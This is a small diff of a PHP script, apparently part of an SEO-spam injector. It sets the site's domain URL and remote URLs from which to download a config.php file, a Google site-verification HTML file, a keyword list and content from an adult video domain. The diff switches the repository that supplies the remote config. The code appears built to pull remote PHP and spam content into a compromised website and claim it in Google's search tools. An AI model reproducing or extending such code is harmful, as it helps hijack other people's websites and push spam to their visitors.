@@ -13,7 +13,7 @@ $clean_host = str_replace('www.', '', $host);
 $full_domain_url = $protocol . $host; // Domain lengkap DENGAN www jika ada
 
 // URL Download
-$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php'; 
+$config_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/config.php'; 
 $google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
 $keyword_url = 'https://player.javpornsub.net/keyword/default.txt'; 
 $base_content_url_path = 'https://player.javpornsub.net/content/';
